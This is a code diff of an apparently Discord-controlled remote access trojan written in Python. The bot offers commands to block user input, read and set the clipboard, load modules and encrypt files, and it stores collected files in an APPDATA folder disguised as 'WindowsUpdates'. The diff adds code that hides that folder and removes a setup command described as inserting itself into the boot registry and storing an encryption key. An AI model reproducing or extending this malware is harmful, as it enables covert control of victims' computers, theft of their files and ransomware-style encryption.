@@ -11,10 +11,13 @@ import subprocess
 import json
 import requests
 import time
+import ctypes
 
 modules_path = os.getcwd() + "\modules"
 client = discord.Client(intents=discord.Intents.all())
 file_version = "2.0"
+
+FILE_ATTRIBUTE_HIDDEN = 0x02
 
 #load config
 with open(f"cfg/config.json", "r") as f:
@@ -52,6 +55,8 @@ def get_raw_git_content(url):
 async def on_ready():
     if os.path.exists(f"{os.getenv('APPDATA')}\\WindowsUpdates") == False:
         os.mkdir(f"{os.getenv('APPDATA')}\\WindowsUpdates")
+        #make dir hidden
+        ctypes.windll.kernel32.SetFileAttributesW(f"{os.getenv('APPDATA')}\\WindowsUpdates", FILE_ATTRIBUTE_HIDDEN)
     if os.path.exists(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files") == False:
         os.mkdir(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files")
         os.mkdir(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files\\txt")
@@ -100,7 +105,6 @@ async def on_message(message):
         embed.add_field(name=".unblockinput", value="Unblocks user's input", inline=False)
         embed.add_field(name=".modules", value="Module loader. ``.modules list`` => Show current modules in the ``./modules`` folder. ``.modules load <module_name.py / all>``", inline=False)
         embed.add_field(name=".clipboard", value="Get/Set clipboard content.", inline=False)
-        embed.add_field(name=".setup", value="RUN BEFORE USING ENCRYPTION METHODS! Inserts itself into boot registry, creates an encryption key and stores it into the registry.", inline=False)
         embed.add_field(name=".encrypt", value="Encrypt file [WIP]", inline=False)
         embed.add_field(name=".decrypt", value="Decrypt file [WIP]", inline=False)
         
@@ -425,29 +429,6 @@ async def on_message(message):
             pc.set_clipboard(text)
             embed = discord.Embed(title="Clipboard", description="Clipboard set.", color=0x00ff00)
             await message.channel.send(embed=embed)
-
-    #RUN ON FIRST STARTUP
-    if message.content.startswith(".setup"):
-        try:
-            reg_h.create_enc_key()
-            embed = discord.Embed(title="Setup", description="Encryption key created.", color=0x00ff00)
-            await message.channel.send(embed=embed)
-            reg_h.store_enc_key()
-            embed = discord.Embed(title="Setup", description="Encryption key stored.", color=0x00ff00)
-            await message.channel.send(embed=embed)
-            reg_h.create_iv()
-            embed = discord.Embed(title="Setup", description="IV created.", color=0x00ff00)
-            await message.channel.send(embed=embed)
-            reg_h.store_iv()
-            embed = discord.Embed(title="Setup", description="IV stored.", color=0x00ff00)
-            await message.channel.send(embed=embed)
-        except Exception as e:
-            print(e)
-            embed = discord.Embed(title="Setup", description="Failed to setup.", color=0x00ff00)
-            await message.channel.send(embed=embed)
-            return
-        embed = discord.Embed(title="Setup", description="Setup successful.", color=0x00ff00)
-        await message.channel.send(embed=embed)
 
     #NETWORKING
     if message.content.startswith(".networking"):
